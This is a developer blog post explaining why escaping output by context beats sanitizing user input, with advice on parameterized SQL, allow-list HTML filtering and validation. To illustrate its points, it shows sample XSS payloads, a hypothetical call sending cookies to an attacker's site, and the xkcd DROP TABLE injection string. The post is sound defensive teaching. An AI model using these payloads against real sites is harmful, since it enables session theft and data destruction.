---
layout: default
title: Don’t try to sanitize input. Escape output.
permalink: /writings/dont-sanitize-do-escape/
description: Why you should escape output correctly, but generally not sanitize user input.
---
<h1>{{ page.title }}</h1>
<p class="subtitle">February 2020</p>


Every so often developers talk about "sanitizing user input" to prevent cross-site scripting attacks. This is well-intentioned, but leads to a false sense of security, and sometimes mangles perfectly good input.


## How does cross-site scripting happen?

A website is vulnerable to cross-site scripting (XSS) attacks if users can enter information that the site repeats back to them verbatim in a page's HTML. This might cause minor issues (HTML that breaks the page layout) or major ones (JavaScript that sends the user's login cookie to an attacker's site).

Let's walk through a concrete example:

1. NaiveSite allows you to enter your name, which is output as is on your profile page.
2. Billy the Kid enters his name as `Billy <script>alert('Hello Bob!')</script>`.
3. Anyone who visits Billy's profile page gets some HTML including the unescaped `script` tag, which their browser runs.
4. If the `alert()` were changed to something more malicious, like `sendCookies('https://billy.com/cookie-monster')`, Billy may now be collecting the unsuspecting visitor's login information.

Side note: it isn't quite this simple, as login cookies are usually marked `HttpOnly`, which means they're not accessible to JavaScript. But this is NaiveSite, so it's likely they made both an XSS mistake and a cookie one.


## Why input filtering isn't a great idea

The developer has heard of "input filtering" or "sanitizing input", so they write some code to strip out unsafe HTML characters `<>&` from the name before storing it. Problem solved!

But there are two problems with this. For one, a couple might sign up to NaiveSite as <code>Bob&nbsp;&amp;&nbsp;Jane&nbsp;Smith</code>, but the filtering code strips the `&`, and suddenly Bob is on his own, with a middle name of Jane.

Or if the filter is a bit more zealous and also strips `'` and `"`, someone like Bill O'Brien becomes Bill OBrien. Messing up [people's names](https://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/) is not a good look.

Perhaps more importantly, it gives a false sense of security. What does "unsafe" mean? In what context? Sure, `<>&` are unsafe characters for HTML, but what about CSS, JSON, SQL, or even shell scripts? Those have a completely different set of unsafe characters.

For example, NaiveSite might have a PHP template that looks like this:

```html
<html>
...
<script>
var name = "<?=$name?>";
</script>
```

If an attacker sets their name to include double quotes, like `"; badFunc(); "`, they can run arbitrary JavaScript on any NaiveSite pages that display the user's name (which, if you're logged in, is probably all of them).

Another example of this kind of thing is SQL injection, an attack that's closely related to cross-site scripting. NaiveSite is powered by MySQL, and it finds users like so:

```php
$query = "SELECT * FROM users WHERE name = '{$name}'"
```

When a boy named [`Robert'); DROP TABLE users;`](https://xkcd.com/327/) comes along, NaiveSite's entire user database is deleted. Oops!

Incidentally, the mother in the xkcd comic says, "I hope you've learned to sanitize your database inputs." Which is somewhat confusing, but I'll give Randall the benefit of the doubt and assume he meant "escape your database parameters".

In short, it's no good to strip out "dangerous characters", because some characters are dangerous in some contexts and perfectly safe in others.


## Escape your output instead

The only code that knows what characters are dangerous is the code that's outputting in a given context.

So the better approach is to store whatever name the user enters verbatim, and then have the template system HTML-escape when outputting HTML, or properly escape JSON when outputting JSON and JavaScript.

And of course use your SQL engine's parameterized query features so it properly escapes variables when building SQL:

```php
$stmt = $db->prepare('SELECT * FROM users WHERE name = ?');
$stmt->bind_param('s', $name);
```

This is sometimes called “contextual escaping”. If you happen to use Go's [`html/template`](https://golang.org/pkg/html/template/) package, you get automatic contextual escaping for HTML, CSS, and JavaScript. Most other templating systems at least give you automatic HTML escaping, for example React, Jinja2, and Rails templates.


## But what if you *want* raw input?

One tricky situation is when your app's purpose is allowing a user to enter HTML or Markdown for display. In this case you can't escape when rendering output, because the whole purpose is to allow users to add links, images, headings, etc.

So you have to take a different approach. If you're using Markdown, you can either:

1. Allow them to only enter pure Markdown, and convert that to HTML on render (many Markdown libraries allow raw HTML by default; be sure to disable that). This is the most secure option, but also more restrictive.
2. Allow them to use HTML in the Markdown, but only a whitelist of allowed tags and attributes, such as `<a href="...">` and `<img src="...">`. Both [Stack Exchange](https://meta.stackexchange.com/a/135909/160696) and [GitHub](https://github.github.com/gfm/#disallowed-raw-html-extension-) take this second approach.

If you're not using Markdown but want to let your users enter HTML directly, you only have the second option -- you must filter using a whitelist. This is harder to get right than you'd think (for example, `<img src="x" onerror="badFunc()">`), so be sure to use a mature, security-vetted library like [DOMPurify](https://github.com/cure53/DOMPurify).

So in cases where you do need to "echo" raw user input, carefully filter input based on a restrictive whitelist, and store the result in the database. When you come to output it, output it as stored without escaping.

The parallel for SQL injection might be if you're building a data charting tool that allows users to enter arbitrary SQL queries. You might want to allow them to enter `SELECT` queries but not data-modification queries. In these cases you're best off using a proper SQL parser ([like this one](https://github.com/xwb1989/sqlparser)) to ensure it's a well-formed `SELECT` query -- but doing this correctly is not trivial, so be sure to get security review.


## What about validation?

Input sanitization is usually a bad idea, but input *validation* is a good thing.

For example, when you're parsing form fields, and you have a number field that's not a number, or an email address without an `@`, or a "post status" drop-down that can only be one of `draft`, `published`, or `archived` -- then by all means validate it and return an error if it's invalid.

Good web form validation shows errors inline so the user knows exactly what to fix:

![Web form validation](/images/form-validation.png)

You must do validation at least on the backend, otherwise an attacker could bypass the frontend validation and `POST` bogus data to your endpoint directly. In addition, you can also validate early on the frontend to show errors more real-time, without a round trip to the server.


## Further reading

OWASP has two cheat sheets on [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) that contain a lot of further information on escaping.

There's also a StackOverflow [answer to "How can I sanitize user input with PHP?"](https://stackoverflow.com/questions/129677/how-can-i-sanitize-user-input-with-php/130323#130323) that is somewhat PHP-specific, but I found it succinct and helpful. It links to a page on PHP [magic quotes](https://en.wikipedia.org/wiki/Magic_quotes), which were a bad idea and actually removed in PHP 5.4 -- the discussion there is very much in line with what I've written above.

If you have any feedback on this article, please get in touch! Or see the comments on [Hacker News](https://news.ycombinator.com/item?id=22431022) and [programming reddit](https://www.reddit.com/r/programming/comments/fa7rn8/dont_try_to_sanitize_input_escape_output/).


{% include sponsor.html %}
